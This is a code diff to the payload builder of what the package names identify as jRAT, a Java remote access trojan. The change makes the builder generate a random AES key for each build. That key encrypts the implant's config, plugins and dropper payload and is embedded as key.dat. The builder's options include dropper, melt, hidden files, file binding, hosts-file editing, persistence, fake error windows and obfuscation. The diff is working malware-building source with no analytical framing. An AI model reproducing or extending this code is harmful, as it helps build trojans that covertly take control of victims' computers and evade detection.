@@ -15,7 +15,6 @@ import io.jrat.client.utils.ZkmUtils;
 import io.jrat.common.codec.Base64;
 import io.jrat.common.codec.Hex;
 import io.jrat.common.crypto.Crypto;
-import io.jrat.common.crypto.EncryptionKey;
 import io.jrat.common.hash.Md5;
 import io.jrat.common.hash.Sha1;
 
@@ -34,6 +33,9 @@ import java.util.zip.ZipException;
 import java.util.zip.ZipFile;
 import java.util.zip.ZipOutputStream;
 
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
+
 import jrat.api.utils.JarUtils;
 
 import com.redpois0n.zkmlib.Configuration;
@@ -49,7 +51,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, EncryptionKey key, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm) {
 		listener.start();
 
 		boolean obfuscate = zkm != null;
@@ -71,6 +73,11 @@ public class Build {
 		Md5 md5 = new Md5();
 
 		try {
+			
+			KeyGenerator keyGen = KeyGenerator.getInstance("AES");
+	        keyGen.init(128);
+	        SecretKey secretKey = keyGen.generateKey();
+	        byte[] key = secretKey.getEncoded();
 
 			File output;		
 
@@ -143,14 +150,14 @@ public class Build {
 				int configSize = 0;
 				
 				for (String str : config.keySet()) {
-					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key.getKey());
+					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key);
 					configSize += enc.length;
 				}
 
 				listener.reportProgress(30, "Writing config (" + configSize + " bytes)" , BuildStatus.INFO);
 				
 				for (String str : config.keySet()) {
-					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key.getKey());
+					byte[] enc = Crypto.encrypt((str + "=" + config.get(str) + "SPLIT").getBytes("UTF-8"), key);
 					outputStub.write(enc);
 				}
 
@@ -181,7 +188,7 @@ public class Build {
 			try {
 				entry = new ZipEntry("key.dat");
 				outputStub.putNextEntry(entry);
-				outputStub.write(key.getKey());
+				outputStub.write(key);
 				outputStub.closeEntry();
 			} catch (Exception ex) {
 				if (ex instanceof ZipException && ex.getMessage().contains("duplicate entry")) {
@@ -233,7 +240,7 @@ public class Build {
 				entry = new ZipEntry("plugins.dat");
 				outputStub.putNextEntry(entry);
 				for (int i = 0; i < plugins.length; i++) {
-					outputStub.write((Crypto.encrypt(plugins[i], key.getKey()) + ",").getBytes("UTF-8"));
+					outputStub.write((Crypto.encrypt(plugins[i], key) + ",").getBytes("UTF-8"));
 				}
 				outputStub.closeEntry();
 			}
@@ -255,7 +262,7 @@ public class Build {
 
 			if (dropper) {
 				listener.reportProgress(50, "Writing stub into dropper (" + tempStubCleanJar.length() + " bytes)", BuildStatus.INFO);
-				byte[] installerKey = key.getKey();
+				byte[] installerKey = key;
 				FileCrypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);
 
 				if (obfuscate) {
